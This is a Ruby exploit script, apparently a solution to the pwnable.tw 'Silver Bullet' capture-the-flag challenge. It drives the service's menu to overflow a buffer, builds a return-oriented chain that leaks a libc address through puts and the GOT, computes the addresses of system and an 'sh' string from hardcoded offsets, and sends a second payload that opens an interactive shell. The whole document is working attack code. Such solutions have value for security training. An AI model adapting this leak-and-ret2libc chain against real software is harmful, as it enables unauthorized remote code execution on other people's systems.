#!/usr/bin/env ruby
require '~/Tools/pwnlib.rb'

local = false#true
if local
	host, port = '127.0.0.1', 4445
	puts_offset = 0x5f870
	system_offset=0x0003ab30
	sh_offset=0xe6a0
else
	host, port = 'ctf.pwnable.tw', 4869
	puts_offset = 0x0005f140
	system_offset=0x0003a940
	sh_offset=0x12412
end

def create(description)
	@r.recv_until("Your choice :")
	@r.send("1\n")
	@r.recv_until("Give me your description of bullet :")
	@r.send("#{description}")
	puts @r.recv()#_until("Good luck !!")
end

def power_up(description)
	@r.recv_until("Your choice :")
        @r.send("2\n")
	@r.recv_until("Give me your another description of bullet :")
        @r.send("#{description}")
	puts @r.recv_until("Enjoy it !")
end
def beat()
	@r.recv_until("Your choice :")
        @r.send("3\n")
end 

def p32(*addr)
	addr.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r = r
	
	puts = 0x80484a8
	puts_got = 0x804afdc
	start = 0x80484f0

	create("a"*24)
	power_up("b"*24)

	payload = "a"*7
	payload << p32(puts, start, puts_got)
	payload << "a"*5
	power_up(payload)
	
	beat()
	beat()
	puts @r.recv_until("Oh ! You win !!\n")
	libc_base = @r.recv(4).unpack("L")[0] - puts_offset
	system = libc_base + system_offset
	sh = libc_base + sh_offset
	
	create("a"*24)
	power_up("b"*24)
	payload = "a"*7
        payload << p32(system, start, sh)
        payload << "a"*5
        power_up(payload)
	beat()
        beat()
	@r.interactive()
end
